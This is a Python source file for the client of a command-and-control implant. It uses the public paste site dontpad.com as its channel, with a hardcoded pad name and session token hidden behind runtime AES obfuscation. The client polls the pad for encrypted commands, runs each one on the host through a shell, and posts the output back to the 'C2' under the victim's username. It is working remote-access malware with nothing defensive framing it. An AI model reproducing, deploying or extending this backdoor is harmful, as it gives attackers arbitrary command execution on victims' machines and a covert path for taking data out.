import requests
import time
import subprocess
from observer import Observer
import getpass
from criptographer import Criptographer
from Crypto.Cipher import AES
import base64
import os

# Funções de encryptação e decryptação
def encrypt_string(s):
    key = os.urandom(16)  # Gere uma chave aleatória de 16 bytes
    cipher = AES.new(key, AES.MODE_EAX)
    nonce = cipher.nonce
    ciphertext, tag = cipher.encrypt_and_digest(s.encode('utf-8'))
    return base64.b64encode(nonce + ciphertext).decode('utf-8'), base64.b64encode(key).decode('utf-8')

def decrypt_string(encrypted, key):
    key = base64.b64decode(key)
    encrypted = base64.b64decode(encrypted)
    nonce = encrypted[:16]
    ciphertext = encrypted[16:]
    cipher = AES.new(key, AES.MODE_EAX, nonce=nonce)
    return cipher.decrypt(ciphertext).decode('utf-8')

# Encryptando strings sensíveis
encrypted_base_url, base_url_key = encrypt_string("https://api.dontpad.com")
encrypted_pad_name, pad_name_key = encrypt_string("yaguinhofodinha")
encrypted_session_token, session_token_key = encrypt_string("-25751fc88e6e559870fd")

class Client:
    def __init__(self, url):
        self.url = url
        self.command = ''
        self.result = ''
        self.first_run = True
        self.username = getpass.getuser()

    def init_dontpad(self):
        data = {
            "text": Criptographer.encrypt('whoami', getpass.getuser()),
            "lastModified": int(time.time() * 1000),
            "force": "true",
            "session-token": decrypt_string(encrypted_session_token, session_token_key)
        }
        requests.post(f"{decrypt_string(encrypted_base_url, base_url_key)}/{decrypt_string(encrypted_pad_name, pad_name_key)}/{getpass.getuser()}/request", data=data)

    def start(self, command_body):
        print("Comando recebido:\n", Criptographer.decrypt(command_body, self.username))
        if self.first_run:
            self.first_run = False
            self.init_dontpad()
            self.send_result_to_c2()

        self.execute_command(command_body)

    def execute_command(self, command_body):
        self.command = Criptographer.decrypt(command_body, self.username).strip()
        if self.command is None or self.command.lower() == "exit":
            raise SystemExit(0)

        self.result = self.execute()
        self.send_result_to_c2()

    def execute(self):
        try:
            processo = subprocess.Popen(
                self.command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                encoding="utf-8",
                errors="ignore"
            )
            stdout, stderr = processo.communicate(timeout=20)
            if stderr:
                return f"Erro na execução do comando: {stderr}"
            return stdout.replace("�", "")
        except Exception as e:
            return f"Erro na execução do comando: {e}"

    def send_result_to_c2(self):
        data = {
            "text": Criptographer.encrypt(self.result, self.username),
            "lastModified": int(time.time() * 1000),
            "force": "true",
            "session-token": decrypt_string(encrypted_session_token, session_token_key)
        }
        print(f'Sending result to C2: {data}')
        res = requests.post(f"{decrypt_string(encrypted_base_url, base_url_key)}/{decrypt_string(encrypted_pad_name, pad_name_key)}/{getpass.getuser()}/response", data=data)
        print(res.status_code, res.url)

if __name__ == "__main__":
    username = getpass.getuser()

    url_with_username = (
        f"{decrypt_string(encrypted_base_url, base_url_key)}/{decrypt_string(encrypted_pad_name, pad_name_key)}/{username}/request.body.json"
        f"?lastModified=0&session-token={decrypt_string(encrypted_session_token, session_token_key)}"
    )

    first_url = (
        f"{decrypt_string(encrypted_base_url, base_url_key)}/{decrypt_string(encrypted_pad_name, pad_name_key)}/request.body.json"
        f"?lastModified=0&session-token={decrypt_string(encrypted_session_token, session_token_key)}"
    )

    client = Client(url=url_with_username)
    observer = Observer(first_url=first_url, url_with_username=url_with_username, client=client)
    observer.start()